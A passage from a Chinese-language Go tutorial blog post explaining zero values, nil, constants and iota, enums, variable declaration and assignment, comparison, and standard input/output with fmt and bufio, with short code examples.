value</code> ，并不是指数字零 ，而是说一个类型的空值或默认值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">数字类型<span class="hljs-number">0</span><br>布尔类型<span class="hljs-literal">false</span><br>字符串类型<span class="hljs-string">&quot;&quot;</span><br>数组固定长度的对应类型的零值集合<br>结构体内部字段都是零值的结构体<br>切片、映射表、函数、接口、指针、通道<span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><h2 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h2><p><code>nil</code> 类似于 C 语言中的 <code>null</code> ，但有区别。<code>nil</code> 只是一些引用类型的零值，并且不属于任何类型，仅仅是一个变量。 </p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>常量的声明需要 <code>const</code> 关键字，并且在初始化时必须赋值，不然无法通过编译</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;butter&quot;</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> msg = <span class="hljs-string">&quot;hello butt3rf1y&quot;</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> num = <span class="hljs-number">114514</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> numExpression = (<span class="hljs-number">1</span>+<span class="hljs-number">2</span>+<span class="hljs-number">3</span>) / <span class="hljs-number">2</span> % <span class="hljs-number">100</span> + num <span class="hljs-comment">// 常量表达式</span><br></code></pre></td></tr></table></figure><p>批量声明常量可以用 <code>()</code> ，可以存在多个</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Count = <span class="hljs-number">1</span><br>   Name  = <span class="hljs-string">&quot;butter&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>   Size = <span class="hljs-number">14</span><br>   Len  = <span class="hljs-number">51</span><br>)<br></code></pre></td></tr></table></figure><p>在同一个常量组中，如果前一个常量赋值且后面没有赋值，那么默认后面的和前面赋值常量值相等，也就是说其值默认就是前面常量的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  A = <span class="hljs-number">1</span><br>  B <span class="hljs-comment">// 1</span><br>  C <span class="hljs-comment">// 1</span><br>  D <span class="hljs-comment">// 1</span><br>  E <span class="hljs-comment">// 1</span><br>)<br></code></pre></td></tr></table></figure><h2 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h2><p><code>iota</code> 是一个内置常量标识符，表示常量声明中无类型整数序数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> <span class="hljs-literal">iota</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p> 列子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 1</span><br>   Num2 <span class="hljs-comment">// 2</span><br>   Num3 <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p>也能这样写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span>*<span class="hljs-number">2</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 2</span><br>   Num2 <span class="hljs-comment">// 4</span><br>   Num3 <span class="hljs-comment">// 6</span><br>   Num4 <span class="hljs-comment">// 8</span><br>)<br></code></pre></td></tr></table></figure><p>还可以</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> &lt;&lt; <span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1</span><br>   Num1 <span class="hljs-comment">// 13(iota &lt;&lt; 2) * 3 + 1</span><br>   Num2 <span class="hljs-comment">// 25</span><br>   Num3 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p><code>iota</code> 的值本质上就是 <code>iota</code> 所在行相对于当前 <code>const</code> 分组的第一行的差值。而不同的 <code>const</code> 分组则相互不会影响。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  Num  = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1 第一行</span><br>  Num2 = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 13 第二行</span><br>  _ <span class="hljs-comment">// 25 第三行</span><br>  Num3 <span class="hljs-comment">//37 第四行</span><br>  Num4 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 4 第五行</span><br>  _ <span class="hljs-comment">// 5 第六行</span><br>  Num5 <span class="hljs-comment">// 6 第七行</span><br>)<br></code></pre></td></tr></table></figure><p><strong>总结：<code>iota</code> 在 <code>const</code> 块中从0开始，每次定义一个新常量时递增1，直到用新的 <code>const</code> 重置。如果常量定义中没有显式赋值，则会继承前一个常量的表达式。并且<code>iota</code> 的值在显式使用时才会更新。</strong></p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>在 go 中，通过自定义类型 + const + iota 来实现枚举</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Season <span class="hljs-type">uint8</span><br><br><span class="hljs-keyword">const</span> (<br>Spring Season = <span class="hljs-literal">iota</span><span class="hljs-comment">//0</span><br>Summer<span class="hljs-comment">//1</span><br>Autumn<span class="hljs-comment">//2</span><br>Winter<span class="hljs-comment">//3</span><br>)<br></code></pre></td></tr></table></figure><p>枚举出来的结果实际上就是数字，go 也不支持直接将其转换为字符串，但我们可以通过给自定义类型添加方法来返回其字符串表现形式，实现 <code>Stringer</code> 接口就行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Season)</span></span> String() <span class="hljs-type">string</span> &#123;<br>  <span class="hljs-keyword">switch</span> s &#123;<br>  <span class="hljs-keyword">case</span> Spring:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;spring&quot;</span><br>  <span class="hljs-keyword">case</span> Summer:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;summer&quot;</span><br>  <span class="hljs-keyword">case</span> Autumn:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;autumn&quot;</span><br>  <span class="hljs-keyword">case</span> Winter:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;winter&quot;</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>go 中的声明是后置的，变量的声明会用到 <code>var</code> 关键字，格式为 <code>var 变量名 类型名</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> happy <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> intNUm <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> char <span class="hljs-type">byte</span><br></code></pre></td></tr></table></figure><p>如果要多个同样类型的变量时，可以写在一起</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> h1,h2,h3,h4 <span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>声明多个不同类型的变量时，可以使用 <code>()</code>，可以存在多个 <code>()</code></p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-keyword">var</span> (<br>  name    <span class="hljs-keyword">string</span><br>  age     <span class="hljs-keyword">int</span><br>  address <span class="hljs-keyword">string</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>  school <span class="hljs-keyword">string</span><br>  <span class="hljs-keyword">class</span> <span class="hljs-keyword">int</span><br>)<br></code></pre></td></tr></table></figure><p><strong>注：变量如果只是声明而不赋值，那么变量存储的值就是对应类型的零值。</strong></p><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p>跟 C 语言规则差不多，但还可以分别赋值，比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> name <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> age <span class="hljs-type">int</span><br>name, age = <span class="hljs-string">&quot;happy&quot;</span>, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>但是每次都要指定类型，还可以短变量初始化，省略 <code>var</code> 关键字和后置类型，编译器会自己判断</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">&quot;happy&quot;</span><br></code></pre></td></tr></table></figure><p>虽然可以不用指定类型，但是在后续赋值时，类型必须保持一致，不然不能通过编译。还得注意的是，短变量初始化不能用 <code>nil</code>，因为 <code>nil</code> 不属于任何类型，编译器无法推断。</p><p>短变量还能批量初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name, age := <span class="hljs-string">&quot;happy&quot;</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>短变量声明虽然无法对一个已存在的变量使用，但是在赋值旧变量的同时声明一个新的变量时可以使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-number">1</span><br>a, b := <span class="hljs-number">2</span>, <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>在 go 中，所有在函数中的变量都必须要被使用，如果只是声明了变量，没有使用它就会报错，但仅适用于函数内的变量，对于函数外的包级变量无用。</p><h2 id="匿名"><a href="#匿名" class="headerlink" title="匿名"></a>匿名</h2><p>用 <code>_</code> 可以表示不需要某一个变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Open(name <span class="hljs-type">string</span>) (*File, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>比如 <code>os.Open</code> 函数有两个返回值，我们只想要第一个，不想要第二个，可以按照下面这样写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">file, _ := os.Open(<span class="hljs-string">&quot;readme.txt&quot;</span>)<br></code></pre></td></tr></table></figure><p>未使用的变量是无法通过编译的，当你不需要某一个变量时，就可以使用下划线 <code>_</code> 代替。</p><h2 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h2><p>在 go 中，如果想要交换两个变量的值，不需要使用指针，可以使用赋值运算符直接进行交换，语法上看起来非常直观，例子如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span><br>num1, num2 = num2, num1<br></code></pre></td></tr></table></figure><p>三个变量也是如此</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">num1, num2, num3 := <span class="hljs-number">114</span>, <span class="hljs-number">514</span>, <span class="hljs-number">22</span><br>num1, num2, num3  = num3, num2, num1<br></code></pre></td></tr></table></figure><p>go 里面有一个特别有意思的规则，进行多个变量赋值运算时，它的顺序是先计算值再赋值，不是从左到右计算，这就和其他语言大相径庭了。比如说下面的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, a+b<br></code></pre></td></tr></table></figure><p>上面代码答案是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>它会将 a, b, c 三个数的值分别计算好再赋给它们，就等同于下面这段代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c = <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>当涉及到函数调用时，这个效果就更明显，有一个函数<code>sum</code>可以计算两个数字的返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sum</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>  <span class="hljs-keyword">return</span> a + b<br>&#125;<br></code></pre></td></tr></table></figure><p>通过函数来进行两数相加</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b, c := <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><br>a, b, c = b, c, sum(a, b)<br></code></pre></td></tr></table></figure><p>结果没有变化，因为在计算<code>sum</code>函数返回值时，它传入的参数依旧是 0 和 1</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>所以代码应该写成这样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a, b = b, c<br>c = a + b<br></code></pre></td></tr></table></figure><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>变量之间的比较时它们的类型必须相同，go 语言中不存在隐式类型转换，像下面这样的代码编译是无法通过的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(a == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>所以必须使用强制类型转换</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a <span class="hljs-type">uint64</span><br>  <span class="hljs-keyword">var</span> b <span class="hljs-type">int64</span><br>  fmt.Println(<span class="hljs-type">int64</span>(a) == b)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用 <code>min </code>函数比较最小值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">minVal := min(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.2</span>)<br></code></pre></td></tr></table></figure><p>使用 <code>max</code> 函数比较最大值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">maxVal := max(<span class="hljs-number">100</span>, <span class="hljs-number">22</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1.12</span>)<br></code></pre></td></tr></table></figure><p>它们的参数支持所有的可比较类型，go 中的可比较类型有</p><ul><li>布尔</li><li>数字</li><li>字符串</li><li>指针</li><li>通道 （仅支持判断是否相等）</li><li>元素是可比较类型的数组（切片不可比较）（仅支持判断是否相等）（仅支持相同长度的数组间的比较，因为数组长度也是类型的一部分，而不同类型不可比较）</li><li>字段类型都是可比较类型的结构体（仅支持判断是否相等）</li></ul><p>除此之外，还可以通过导入标准库 <code>cmp</code> 来判断，不过仅支持有序类型的参数，在 go 中内置的有序类型只有数字和字符串。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;cmp&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  cmp.Compare(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>  cmp.Less(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>函数内部可以通过花括号建立一个代码块，彼此之间的变量作用域是相互独立的，不受干扰，无法访问，但是会受到父块中的影响。</p><h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>   Stdin  = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdin), <span class="hljs-string">&quot;/dev/stdin&quot;</span>)<br>   Stdout = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stdout), <span class="hljs-string">&quot;/dev/stdout&quot;</span>)<br>   Stderr = NewFile(<span class="hljs-type">uintptr</span>(syscall.Stderr), <span class="hljs-string">&quot;/dev/stderr&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p>在 <code>os</code> 包下有三个外暴露的文件描述符，其类型都是 <code>*os.File</code> ，分别是：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">os.Stdin标准输入<br>os.Stdout标准输出<br>os.Stderr标准错误<br></code></pre></td></tr></table></figure><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>像读文件一样（麻烦）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> buf [<span class="hljs-number">1024</span>]<span class="hljs-type">byte</span><br>  n, _ := os.Stdin.Read(buf[:])<br>  os.Stdout.Write(buf[:n])<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt </code>包提供了几个函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 扫描从os.Stdin读入的文本，根据空格分隔，换行也被当作空格</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scan</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// 与Scan类似，但是遇到换行停止扫描</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanln</span><span class="hljs-params">(a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// 根据格式化的字符串扫描</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>读取两个数字</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>  fmt.Scanln(&amp;a, &amp;b)<br>  fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><p>读取固定长度的数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  n := <span class="hljs-number">10</span><br>  s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, n)<br>  <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> n &#123;<br>    fmt.Scan(&amp;s[i])<br>  &#125;<br>  fmt.Println(s)<br>&#125;<br><br>&gt;&gt; <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span><br>&gt;&gt; [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><h3 id="bufio"><a href="#bufio" class="headerlink" title="bufio"></a>bufio</h3><p>有大量输入要读取的时建议使用 <code>bufio.Reader</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    reader := bufio.NewReader(os.Stdin)<br>    <span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><br>    fmt.Fscanln(reader, &amp;a, &amp;b)<br>    fmt.Printf(<span class="hljs-string">&quot;%d + %d = %d\n&quot;</span>, a, b, a+b)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scanner"><a href="#scanner" class="headerlink" title="scanner"></a>scanner</h3><p>与 <code>bufio.Reader</code>  类似，不过它按行读取</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  scanner := bufio.NewScanner(os.Stdin)<br>  <span class="hljs-keyword">for</span> scanner.Scan() &#123;<br>    line := scanner.Text()<br>    <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;exit&quot;</span> &#123;<br>      <span class="hljs-keyword">break</span><br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;scan&quot;</span>, line)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span><br>scan <span class="hljs-number">1</span><br><span class="hljs-number">2</span><br>scan <span class="hljs-number">2</span><br><span class="hljs-number">3</span><br>scan <span class="hljs-number">3</span><br>exit<br></code></pre></td></tr></table></figure><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>可以直接将字符串写入到标准输出中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;os&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>os.Stdout.WriteString(<span class="hljs-string">&quot;hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="print-println"><a href="#print-println" class="headerlink" title="print&#x2F;println"></a>print&#x2F;println</h3><p>go 中两个内置的函数 <code>print</code>，<code>println</code>，他们会将参数输出到标准错误中，仅做调试用，一般不推荐使用</p><h3 id="fmt-1"><a href="#fmt-1" class="headerlink" title="fmt"></a>fmt</h3><p><code>fmt</code> 包提供了 <code>fmt.Println</code> 函数，该函数默认会将参数输出到标准输出中。它的参数<strong>支持任意类型</strong>，如果类型实现了 <code>String</code> 接口也会调用 <code>String </code>方法来获取其字符串表现形式，所以它输出的内容可读性比较高，适用于大部分情况，不过由于内部用到了反射，在性能敏感的场景不建议大量使用。</p><h3 id="bufio-1"><a href="#bufio-1" class="headerlink" title="bufio"></a>bufio</h3><p><code>bufio 